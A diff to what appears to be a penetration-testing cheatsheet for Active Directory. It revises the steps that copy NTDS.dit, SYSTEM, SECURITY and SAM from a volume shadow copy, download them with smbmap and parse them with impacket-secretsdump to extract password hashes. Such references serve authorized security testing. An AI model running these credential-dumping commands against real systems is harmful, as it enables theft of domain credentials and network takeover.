@@ -139,7 +139,7 @@ searchsploit <service_name>
 
 ## 3. **Unprivileged account only**
 
-### Get a shell
+### Get a shell
 
 > For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypass)
 
@@ -205,14 +205,16 @@ impacket-secretsdump <domain>/<domain_admin>:'<pass>'@<target> -history -just-dc
 vssadmin create shadow /for=C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\NTDS.dit.bak
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SYSTEM.bak
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SECURITY.bak
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\SECURITY.bak
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\SAM.bak
 
-# 2) use any tool that can retrieve these 2 files 
+# 2) use any tool that can retrieve these 4 files 
 smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\NTDS.dit.bak'
 smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SYSTEM.bak'
 smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SECURITY.bak'
+smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SAM.bak'
 
 # 3) Locally parse theses files
-impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
+impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak -security SECURITY.bak -sam SAM.bak LOCAL
 ```
 
